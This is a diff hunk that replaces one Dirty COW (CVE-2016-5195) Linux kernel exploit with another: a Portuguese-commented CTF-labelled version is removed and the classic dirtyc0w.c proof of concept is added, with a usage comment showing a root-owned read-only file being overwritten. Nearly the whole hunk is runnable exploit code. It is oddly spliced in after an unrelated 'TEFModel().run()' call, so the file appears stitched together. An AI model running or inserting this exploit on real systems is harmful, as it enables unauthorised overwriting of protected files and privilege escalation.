@@ -142,67 +142,90 @@
         TEFModel().run()
 
 
-        // Dirty COW (CVE-2016-5195) minimal exploit
-// Versão usada em CTFs para demonstração controlada
-// Autor original: Phil Oester / Dirty COW PoC adaptado
-
+       /*
+    ####################### dirtyc0w.c #######################
+    $ sudo -s
+    # echo this is not a test > foo
+    # chmod 0404 foo
+    $ ls -lah foo
+    -r-----r-- 1 root root 19 Oct 20 15:23 foo
+    $ cat foo
+    this is not a test
+    $ gcc -pthread dirtyc0w.c -o dirtyc0w
+    $ ./dirtyc0w foo m00000000000000000
+    mmap 56123000
+    madvise 0
+    procselfmem 1800000000
+    $ cat foo
+    m00000000000000000
+    ####################### dirtyc0w.c #######################
+    */
+    #include <stdio.h>
+    #include <sys/mman.h>
     #include <fcntl.h>
     #include <pthread.h>
-    #include <string.h>
-    #include <stdio.h>
-    #include <stdlib.h>
     #include <unistd.h>
-    #include <sys/mman.h>
     #include <sys/stat.h>
+    #include <string.h>
+    #include <stdint.h>
     
     void *map;
     int f;
     struct stat st;
-    char *file;
-    char *payload;
-
-    void *madviseThread(void *arg) {
-    for (int i = 0; i < 1000000; i++)
-        madvise(map, st.st_size, MADV_DONTNEED);
-    return NULL;
+    char *name;
+     
+    void *madviseThread(void *arg)
+    {
+      char *str;
+      str=(char*)arg;
+      int i,c=0;
+      for(i=0;i<100000000;i++)
+      {
+    
+        c+=madvise(map,100,MADV_DONTNEED);
+      }
+      printf("madvise %d\n\n",c);
     }
-
-    void *writeThread(void *arg) {
-    int mem = open("/proc/self/mem", O_RDWR);
-    for (int i = 0; i < 1000000; i++) {
-        lseek(mem, (off_t)map, SEEK_SET);
-        write(mem, payload, strlen(payload));
+     
+    void *procselfmemThread(void *arg)
+    {
+      char *str;
+      str=(char*)arg;
+    
+      int f=open("/proc/self/mem",O_RDWR);
+      int i,c=0;
+      for(i=0;i<100000000;i++) {
+    
+        lseek(f,(uintptr_t) map,SEEK_SET);
+        c+=write(f,str,strlen(str));
+      }
+      printf("procselfmem %d\n\n", c);
     }
-    return NULL;
+     
+     
+    int main(int argc,char *argv[])
+    {
+    
+      if (argc<3) {
+      (void)fprintf(stderr, "%s\n",
+          "usage: dirtyc0w target_file new_content");
+      return 1; }
+      pthread_t pth1,pth2;
+    
+      f=open(argv[1],O_RDONLY);
+      fstat(f,&st);
+      name=argv[1];
+    
+      map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
+      printf("mmap %zx\n\n",(uintptr_t) map);
+    
+      pthread_create(&pth1,NULL,madviseThread,argv[1]);
+      pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
+    
+      pthread_join(pth1,NULL);
+      pthread_join(pth2,NULL);
+      return 0;
     }
-
-    int main(int argc, char *argv[]) {
-    if (argc < 3) {
-        printf("Uso: %s <ficheiro> <texto_novo>\n", argv[0]);
-        return 1;
-    }
-    file = argv[1];
-    payload = argv[2];
-
-    f = open(file, O_RDONLY);
-    if (f < 0) {
-        perror("open");
-        return 1;
-    }
-
-    fstat(f, &st);
-    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
-
-    pthread_t p1, p2;
-    pthread_create(&p1, NULL, madviseThread, NULL);
-    pthread_create(&p2, NULL, writeThread, NULL);
-
-    pthread_join(p1, NULL);
-    pthread_join(p2, NULL);
-
-    printf("Exploit executado! Verifica o ficheiro %s.\n", file);
-    return 0;
-}
 
 
 
